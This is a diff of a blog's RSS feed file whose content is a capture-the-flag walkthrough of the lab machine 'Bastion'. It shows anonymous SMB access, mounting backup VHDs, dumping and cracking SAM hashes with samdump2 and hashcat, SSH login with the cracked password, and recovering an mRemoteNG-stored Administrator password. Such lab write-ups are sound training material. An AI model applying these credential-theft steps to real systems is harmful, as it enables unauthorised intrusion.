@@ -5,8 +5,8 @@
     <description>A blog</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Wed, 25 Sep 2019 22:36:30 -0400</pubDate>
-    <lastBuildDate>Wed, 25 Sep 2019 22:36:30 -0400</lastBuildDate>
+    <pubDate>Sun, 29 Sep 2019 16:30:44 -0400</pubDate>
+    <lastBuildDate>Sun, 29 Sep 2019 16:30:44 -0400</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
     
       <item>
@@ -70,7 +70,7 @@ Enter WORKGROUP\root's password:
     IPC$            IPC       Remote IPC 
     &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;&lt;code&gt;ADMIN$&lt;/code&gt;, &lt;code&gt;C$&lt;/code&gt;, and &lt;code&gt;IPC$&lt;/code&gt; are all default shares. &lt;code&gt;Backups&lt;/code&gt; is the only one that stands out. I attempt to authenticate to it with no credentials.&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ADMIN$&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;C$&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;IPC$&lt;/code&gt; are all default shares. &lt;code class=&quot;highlighter-rouge&quot;&gt;Backups&lt;/code&gt; is the only one that stands out. I attempt to authenticate to it with no credentials.&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# smbclient \\\\10.10.10.134\\Backups
 Enter WORKGROUP\root's password:
@@ -84,9 +84,9 @@ smb: \&amp;gt; dir
 
                 7735807 blocks of size 4096. 2745314 blocks available&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;Our null session worked. We have read access to the &lt;code&gt;Backups&lt;/code&gt; share.&lt;/p&gt;
+&lt;p&gt;Our null session worked. We have read access to the &lt;code class=&quot;highlighter-rouge&quot;&gt;Backups&lt;/code&gt; share.&lt;/p&gt;
 
-&lt;p&gt;Although there aren’t that many files in the share, some are massive. Here’s a quick look of the interesting directory &lt;code&gt;WindowsImageBackup&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Although there aren’t that many files in the share, some are massive. Here’s a quick look of the interesting directory &lt;code class=&quot;highlighter-rouge&quot;&gt;WindowsImageBackup&lt;/code&gt;.&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\&amp;gt; dir
   .                                   D        0  Fri Feb 22 07:45:32 2019                                                          
@@ -97,7 +97,7 @@ smb: \&amp;gt; dir
                                                             
   &amp;lt; . . . snip . . . &amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;VHD files? Definitely something to look at. But &lt;code&gt;5418299392&lt;/code&gt; blocks? That’s over &lt;em&gt;two terabytes&lt;/em&gt;. We need a way to enumerate the VHDs without downloading them entirely.&lt;/p&gt;
+&lt;p&gt;Virtual hard disks? Definitely something to look at. But &lt;code class=&quot;highlighter-rouge&quot;&gt;5418299392&lt;/code&gt; blocks? That’s over two terabytes. We need a way to enumerate the VHDs without downloading them entirely.&lt;/p&gt;
 
 &lt;h1 id=&quot;mounting-shares-and-vhd-files&quot;&gt;Mounting shares and VHD files&lt;/h1&gt;
 
@@ -108,7 +108,7 @@ Password for anonymous@//10.10.10.134/Backups:  &lt;/code&gt;&lt;/pre&gt;&lt;/fi
 
 &lt;p&gt;&lt;img src=&quot;/images/bastion/image2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Those juicy VHD files, though, aren’t readable this way. To browse through them, we have to mount those as well. For VHD files, we have to first install &lt;code&gt;guestmount&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Those juicy VHDs, though, aren’t readable this way. To browse through them, we have to mount those as well. For VHD files, we have to first install &lt;code class=&quot;highlighter-rouge&quot;&gt;guestmount&lt;/code&gt;.&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# apt-get install libguestfs-tools&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
@@ -124,15 +124,15 @@ Password for anonymous@//10.10.10.134/Backups:  &lt;/code&gt;&lt;/pre&gt;&lt;/fi
 
 &lt;p&gt;&lt;img src=&quot;/images/bastion/image3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;em&gt;Note: One of the VHD files wouldn’t mount properly. Turns out it isn’t necessary to mount anyway.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Note: One of the VHDs wouldn’t mount properly. Turns out it isn’t necessary to mount anyway.&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;Now with read access to the VHD, my first instinct is to go for the &lt;strong&gt;flags&lt;/strong&gt;, but there’s nothing at &lt;code&gt;C:\Users\L4mpje\Desktop&lt;/code&gt; or &lt;code&gt;C:\Users\Administrator\Desktop&lt;/code&gt;. So we clearly don’t have the right access just yet.&lt;/p&gt;
+&lt;p&gt;Now with read access to the VHD, my first instinct is to go for the &lt;strong&gt;flags&lt;/strong&gt;, but there’s nothing at &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\L4mpje\Desktop&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Administrator\Desktop&lt;/code&gt;. So we clearly don’t have the right access just yet.&lt;/p&gt;
 
-&lt;p&gt;Next thing to do would be to search for &lt;strong&gt;user credentials&lt;/strong&gt; (remember the open SSH port?). After we’ve checked for credentials lying around in obvious places, it makes sense to try accessing the SAM and SECURITY files.&lt;/p&gt;
+&lt;p&gt;Next thing to do would be to search for &lt;strong&gt;user credentials&lt;/strong&gt;. After checking for credentials lying around in obvious places, I go for the SAM and SECURITY files.&lt;/p&gt;
 
 &lt;h1 id=&quot;sam-and-security&quot;&gt;SAM and SECURITY&lt;/h1&gt;
 
-&lt;p&gt;Depending on your version of Windows, these can be in a few different locations. Here, they’re in &lt;code&gt;C:\Windows\System32\config&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Depending on your version of Windows, these can be in a few different locations. Here, they’re in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32\config&lt;/code&gt;.&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/vhd1/Windows/System32/config# dir
 &amp;lt; . . . snip . . . &amp;gt;
@@ -148,7 +148,7 @@ SECURITY
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/vhd1/Windows/System32/config# cp SAM ~
 root@kali:~/vhd1/Windows/System32/config# cp SYSTEM ~&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;To get the hashes, I use &lt;code&gt;samdump2&lt;/code&gt; and pass the &lt;code&gt;SYSTEM&lt;/code&gt; and &lt;code&gt;SAM&lt;/code&gt; files as arguments.&lt;/p&gt;
+&lt;p&gt;To get the hashes, I use &lt;code class=&quot;highlighter-rouge&quot;&gt;samdump2&lt;/code&gt; and pass the &lt;code class=&quot;highlighter-rouge&quot;&gt;SYSTEM&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;SAM&lt;/code&gt; files as arguments.&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# samdump2 SYSTEM SAM -o hashes.txt
 root@kali:~# cat hashes.txt
@@ -156,15 +156,15 @@ root@kali:~# cat hashes.txt
 *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;The L4mpje hash takes seconds to crack with &lt;code&gt;hashcat&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The L4mpje hash takes seconds to crack with &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat&lt;/code&gt;.&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;The password for use L4mpje is &lt;strong&gt;bureaulampje&lt;/strong&gt;. The Administrator and Guest account hashes are marked as &lt;code&gt;*disabled*&lt;/code&gt;, so this is the best we’ll get.&lt;/p&gt;
+&lt;p&gt;The password for use L4mpje is &lt;strong&gt;bureaulampje&lt;/strong&gt;. The Administrator and Guest account hashes are marked as &lt;code class=&quot;highlighter-rouge&quot;&gt;*disabled*&lt;/code&gt;, so this is the best we’ll get.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/bastion/image4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;To get in, we &lt;code&gt;ssh&lt;/code&gt; as &lt;strong&gt;L4mpje@10.10.10.134&lt;/strong&gt; with the recovered password.&lt;/p&gt;
+&lt;p&gt;To get in, we &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; as &lt;strong&gt;L4mpje@10.10.10.134&lt;/strong&gt; with the recovered password.&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# ssh L4mpje@10.10.10.134
 L4mpje@10.10.10.134's password: 
@@ -181,7 +181,7 @@ l4mpje@BASTION C:\Users\L4mpje&amp;gt;    &lt;/code&gt;&lt;/pre&gt;&lt;/figure&g
 
 &lt;h1 id=&quot;privilege-escalation-mremoteng-credentials&quot;&gt;Privilege Escalation: mRemoteNG Credentials&lt;/h1&gt;
 
-&lt;p&gt;With Windows privilege escalation, if nothing stands out in the Users folder, I move on to checking what software is insatlled. Here, &lt;code&gt;mRemoteNG&lt;/code&gt; stands out.&lt;/p&gt;
+&lt;p&gt;With Windows privilege escalation, if nothing stands out in the Users folder, I move on to checking what software is installed. Here, &lt;code class=&quot;highlighter-rouge&quot;&gt;mRemoteNG&lt;/code&gt; stands out.&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;l4mpje@BASTION C:\&amp;gt;dir &quot;Program Files (x86)&quot;                                    
  Volume in drive C has no label.                                                
@@ -214,11 +214,13 @@ l4mpje@BASTION C:\Users\L4mpje&amp;gt;    &lt;/code&gt;&lt;/pre&gt;&lt;/figure&g
   &lt;p&gt;mRemoteNG uses insecure methods for password storage and can provide droves of valid credentials during an assessment or competition.&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;p&gt;As the post shows, we can find an encrypted password (right beside &lt;strong&gt;Username=”Administrator”&lt;/strong&gt;) in C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.&lt;/p&gt;
+&lt;p&gt;As the post explains, mRemoteNG is used to help manage remote connections (e.g., SSH, RDP). Credentials for these sessions may be stored insecurely in a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;confCons.xml&lt;/code&gt;. Lo and behold, we can find an encrypted password (right beside &lt;strong&gt;Username=”Administrator”&lt;/strong&gt;) in C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;Node&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DC&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Descr=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Icon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mRemoteNG&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Panel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;General&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;500e7d58-662a-44d4-aff0-3a4f547a3fee&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Username=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Administrator&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Domain=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Password=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Hostname=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Protocol=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RDP&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;.&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;From here, you can find a handful of options available for decrypting an mRemoteNG password (including the one described in the previously linked-to &lt;a href=&quot;http://hackersvanguard.com/mremoteng-insecure-password-storage/&quot;&gt;blog post&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;This specifies that the protocol is RDP, so we can assume that this credential would be reused for SSH as well.&lt;/p&gt;
+
+&lt;p&gt;You can find a handful of options available for decrypting an mRemoteNG password (including the one described in the previously linked-to &lt;a href=&quot;http://hackersvanguard.com/mremoteng-insecure-password-storage/&quot;&gt;blog post&lt;/a&gt;).&lt;/p&gt;
 
 &lt;p&gt;What worked best for me was &lt;a href=&quot;https://github.com/haseebT/mRemoteNG-Decrypt&quot;&gt;mRemoteNG_Decrypt.py&lt;/a&gt;. I copied the encrypted password and passed it as a string to get the plaintext credential.&lt;/p&gt;
 
